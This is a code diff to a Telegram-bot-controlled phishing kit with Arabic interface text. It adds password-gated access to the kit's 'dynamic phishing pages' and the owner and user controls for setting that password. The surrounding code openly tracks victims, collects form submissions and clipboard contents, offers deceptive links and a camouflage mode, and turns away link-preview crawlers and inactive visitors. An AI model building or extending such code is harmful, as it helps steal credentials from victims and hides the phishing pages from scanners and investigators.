@@ -103,6 +103,7 @@ function addUserSub(uid, sub) {
 const _pageWiz = {};          // chatId → { step, data }
 const _pageTpls = {};         // name → config
 const _awaitWelcome = new Set(); // chatIds waiting for welcome message text
+const _awaitPagePass = new Map(); // chatId → { type:'owner'|'user', uid? }
 
 const TPL_THEMES = {
   pubg:  { bg:"#0a0a1a", btn:"#f0a500", accent:"#f0a500", name:"🎮 ببجي",      redirect:"https://www.pubg.com" },
@@ -131,10 +132,12 @@ function sendUserPageMain(chatId, uid, editMsgId) {
   const link = `${hostURL}/p/u/${id}`;
   const text = `🎛️ *لوحة تحكم صفحتك*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${cfg.views||0}\n✅ بيانات مجموعة: ${subs.length}\n🔗 رابطك: \`${link}\``;
   const toggleLbl = cfg.active ? "⏸️ إيقاف الصفحة" : "▶️ تشغيل الصفحة";
+  const passIcon = cfg.pagePassword ? "🔒✅" : "🔒";
   const kb = JSON.stringify({inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:`pgu_quick_${id}`},{text:"📋 السجل",callback_data:`pgu_log_${id}`}],
     [{text:"🔗 روابط مخادعة",callback_data:`pgu_links_${id}`},{text:"🔄 تجديد الرابط",callback_data:`pgu_renew_${id}`}],
-    [{text:"🗑️ مسح البيانات",callback_data:`pgu_clear_${id}`},{text:toggleLbl,callback_data:`pgu_toggle_${id}`}]
+    [{text:"🗑️ مسح البيانات",callback_data:`pgu_clear_${id}`},{text:toggleLbl,callback_data:`pgu_toggle_${id}`}],
+    [{text:`${passIcon} كلمة سر`,callback_data:`pgu_setpass_${id}`}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId,text,{parse_mode:"Markdown",reply_markup:kb});
@@ -144,7 +147,8 @@ function sendPageMain(chatId, editMsgId) {
   const tName = TPL_THEMES[pageConfig.template]?.name || pageConfig.template;
   const status = pageConfig.active ? (pageConfig.camouflage ? "🟡 تمويه" : "🟢 نشطة") : "🔴 متوقفة";
   const toggleLabel = pageConfig.active ? (pageConfig.camouflage ? "✅ تشغيل كاملاً" : "⏸️ وضع تمويه") : "▶️ تشغيل الصفحة";
-  const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}`;
+  const passIcon = pageConfig.pagePassword ? "🔒✅" : "🔒";
+  const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}\n${pageConfig.pagePassword ? "🔒 كلمة سر: مفعّلة" : "🔓 كلمة سر: معطّلة"}`;
   const wIcon = pageConfig.welcomeEnabled ? "📢✅" : "📢";
   const kb = JSON.stringify({ inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
@@ -152,7 +156,7 @@ function sendPageMain(chatId, editMsgId) {
     [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
     [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
     [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
-    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"}]
+    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -555,6 +559,33 @@ app.get("/co/:path/*", async (req, res) => {
 
 // ── Dynamic Phishing Page Routes ──────────────────────────────────────────────
 
+function parseCookies(req) {
+  const raw = req.headers.cookie || '';
+  return Object.fromEntries(raw.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
+}
+
+function passwordPageHTML(verifyUrl, error) {
+  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>التحقق من الهوية</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center}
+.icon{font-size:52px;margin-bottom:14px}.title{font-size:20px;font-weight:700;color:#e0e0ff;margin-bottom:8px}
+.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}
+input{width:100%;background:#0d0d22;border:1px solid #2a2a5a;border-radius:12px;padding:14px 16px;color:#fff;font-size:16px;margin-bottom:16px;outline:none;text-align:center;letter-spacing:4px}
+input:focus{border-color:#4a4aff}
+.btn{width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:14px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer}
+.err{color:#ff5555;font-size:13px;margin-bottom:12px}
+</style></head><body><div class="card">
+<div class="icon">🔐</div>
+<div class="title">التحقق من الهوية</div>
+<div class="sub">هذه الصفحة محمية. أدخل الرمز للمتابعة.</div>
+${error ? `<div class="err">❌ الرمز غير صحيح، حاول مجدداً</div>` : ''}
+<form method="POST" action="${verifyUrl}">
+<input type="password" name="pass" placeholder="••••••" autofocus>
+<button class="btn" type="submit">دخول ←</button>
+</form>
+</div></body></html>`;
+}
+
 // ── User premium page routes ───────────────────────────────────────────────
 app.get("/p/u/:uid", (req, res) => {
   const uid = req.params.uid;
@@ -562,6 +593,12 @@ app.get("/p/u/:uid", (req, res) => {
   if (!prem.pageAccess) return res.redirect("https://www.google.com");
   const cfg = getUserPage(uid);
   if (!cfg.active) return res.redirect("https://www.google.com");
+  if (cfg.pagePassword) {
+    const cookies = parseCookies(req);
+    if (cookies[`pgauth_${uid}`] !== "1") {
+      return res.send(passwordPageHTML(`/p/u/${uid}/verify`, false));
+    }
+  }
   cfg.views = (cfg.views||0) + 1;
   setUserPage(uid, cfg);
   const ip = getIP(req);
@@ -573,6 +610,16 @@ app.get("/p/u/:uid", (req, res) => {
     if (err) return res.status(500).send("Error: " + err.message);
     res.send(html);
   });
+});
+
+app.post("/p/u/:uid/verify", express.urlencoded({extended:false}), (req, res) => {
+  const uid = req.params.uid;
+  const cfg = getUserPage(uid);
+  if (cfg.pagePassword && req.body.pass === cfg.pagePassword) {
+    res.setHeader('Set-Cookie', `pgauth_${uid}=1; Path=/p/u/${uid}; HttpOnly; Max-Age=3600`);
+    return res.redirect(`/p/u/${uid}`);
+  }
+  return res.send(passwordPageHTML(`/p/u/${uid}/verify`, true));
 });
 
 app.post("/p/u/:uid/submit", express.json({limit:"1mb"}), async (req, res) => {
@@ -594,6 +641,12 @@ app.get("/p", (req, res) => {
   if (ua.includes('telegrambot')||ua.includes('twitterbot')||ua.includes('facebookexternalhit')||ua.includes('whatsapp')) return res.status(200).send('OK');
   if (!pageConfig.active) return res.redirect("https://www.google.com");
   if (pageConfig.camouflage) return res.redirect(pageConfig.redirect||"https://www.google.com");
+  if (pageConfig.pagePassword) {
+    const cookies = parseCookies(req);
+    if (cookies['pgauth_owner'] !== "1") {
+      return res.send(passwordPageHTML('/p/verify', false));
+    }
+  }
   pageConfig.views = (pageConfig.views||0) + 1;
   savePageConfig();
   const ip = getIP(req);
@@ -607,6 +660,14 @@ app.get("/p", (req, res) => {
     }
     res.send(html);
   });
+});
+
+app.post("/p/verify", express.urlencoded({extended:false}), (req, res) => {
+  if (pageConfig.pagePassword && req.body.pass === pageConfig.pagePassword) {
+    res.setHeader('Set-Cookie', 'pgauth_owner=1; Path=/p; HttpOnly; Max-Age=3600');
+    return res.redirect('/p');
+  }
+  return res.send(passwordPageHTML('/p/verify', true));
 });
 
 app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
@@ -653,6 +714,27 @@ bot.on('message', async (msg) => {
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
+  }
+
+  // ── Page password input ────────────────────────────────────────────────────
+  if (_awaitPagePass.has(chatId) && msg.text) {
+    const ctx = _awaitPagePass.get(chatId);
+    _awaitPagePass.delete(chatId);
+    const txt = msg.text.trim();
+    if (txt === "/cancel") return bot.sendMessage(chatId, "❌ تم الإلغاء.");
+    if (ctx.type === "owner") {
+      pageConfig.pagePassword = txt;
+      savePageConfig();
+      return bot.sendMessage(chatId, `🔒 *تم تفعيل كلمة السر للصفحة!*\n\nالكود: \`${txt}\`\n\nأي زائر يفتح الرابط سيُطلب منه هذا الكود أولاً.`,
+        {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})});
+    } else {
+      const uid = ctx.uid;
+      const cfg = getUserPage(uid);
+      cfg.pagePassword = txt;
+      setUserPage(uid, cfg);
+      return bot.sendMessage(chatId, `🔒 *تم تفعيل كلمة السر لصفحتك!*\n\nالكود: \`${txt}\``,
+        {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحتي",callback_data:`pg_upage_${uid}`}]]})});
+    }
   }
 
   // ── Welcome message input ──────────────────────────────────────────────────
@@ -1589,6 +1671,30 @@ bot.on('callback_query', async (q) => {
     return sendPageMain(chatId, q.message.message_id);
   }
 
+  if (data === "pg_setpass") {
+    if (q.from.id !== BOT_OWNER) return;
+    const hasPass = !!pageConfig.pagePassword;
+    const passText = hasPass ? `🔒 *كلمة السر للصفحة*\n\nالكود الحالي: \`${pageConfig.pagePassword}\`\n\nاختر إجراء:` : `🔒 *كلمة السر للصفحة*\n\n_(غير مفعّلة حالياً)_\n\nبعد التفعيل، أي شخص يفتح الرابط سيُطلب منه الكود أولاً.`;
+    return bot.sendMessage(chatId, passText, {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+      hasPass ? [{text:"✏️ تغيير الكود",callback_data:"pg_setpass_new"},{text:"🗑️ إزالة كلمة السر",callback_data:"pg_clrpass"}] : [{text:"➕ تفعيل كلمة سر",callback_data:"pg_setpass_new"}],
+      [{text:"🔙 رجوع",callback_data:"pg_main"}]
+    ]})});
+  }
+
+  if (data === "pg_setpass_new") {
+    if (q.from.id !== BOT_OWNER) return;
+    _awaitPagePass.set(chatId, {type:"owner"});
+    return bot.sendMessage(chatId, `🔒 *اكتب الكود السري للصفحة:*\n\nمثال: \`1234\` أو \`mycode\`\n\nأو /cancel للإلغاء`, {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
+  }
+
+  if (data === "pg_clrpass") {
+    if (q.from.id !== BOT_OWNER) return;
+    pageConfig.pagePassword = null;
+    savePageConfig();
+    bot.answerCallbackQuery(q.id, {text:"🔓 تم إزالة كلمة السر"}).catch(()=>{});
+    return sendPageMain(chatId, q.message.message_id);
+  }
+
   if (data === "pg_welcome") {
     if (q.from.id !== BOT_OWNER) return;
     const hasMsg = !!pageConfig.welcomeMsg;
@@ -1962,6 +2068,39 @@ bot.on('callback_query', async (q) => {
   if (data.startsWith("pgu_back_")) {
     const uid = data.replace("pgu_back_","");
     if (String(chatId) !== uid) return;
+    return sendUserPageMain(chatId, uid, q.message.message_id);
+  }
+
+  if (data.startsWith("pgu_setpass_")) {
+    const uid = data.replace("pgu_setpass_","");
+    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
+    const cfg = getUserPage(uid);
+    const hasPass = !!cfg.pagePassword;
+    const passText = hasPass
+      ? `🔒 *كلمة السر لصفحتك*\n\nالكود الحالي: \`${cfg.pagePassword}\`\n\nاختر إجراء:`
+      : `🔒 *كلمة السر لصفحتك*\n\n_(غير مفعّلة حالياً)_\n\nبعد التفعيل، أي شخص يفتح رابطك سيُطلب منه الكود أولاً.`;
+    return bot.sendMessage(chatId, passText, {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+      hasPass
+        ? [{text:"✏️ تغيير الكود",callback_data:`pgu_setpass_new_${uid}`},{text:"🗑️ إزالة",callback_data:`pgu_clrpass_${uid}`}]
+        : [{text:"➕ تفعيل كلمة سر",callback_data:`pgu_setpass_new_${uid}`}],
+      [{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
+    ]})});
+  }
+
+  if (data.startsWith("pgu_setpass_new_")) {
+    const uid = data.replace("pgu_setpass_new_","");
+    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
+    _awaitPagePass.set(chatId, {type:"user", uid});
+    return bot.sendMessage(chatId, `🔒 *اكتب الكود السري لصفحتك:*\n\nأو /cancel للإلغاء`, {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
+  }
+
+  if (data.startsWith("pgu_clrpass_")) {
+    const uid = data.replace("pgu_clrpass_","");
+    if (String(chatId) !== uid && chatId !== BOT_OWNER) return;
+    const cfg = getUserPage(uid);
+    cfg.pagePassword = null;
+    setUserPage(uid, cfg);
+    bot.answerCallbackQuery(q.id, {text:"🔓 تم إزالة كلمة السر"}).catch(()=>{});
     return sendUserPageMain(chatId, uid, q.message.message_id);
   }
 
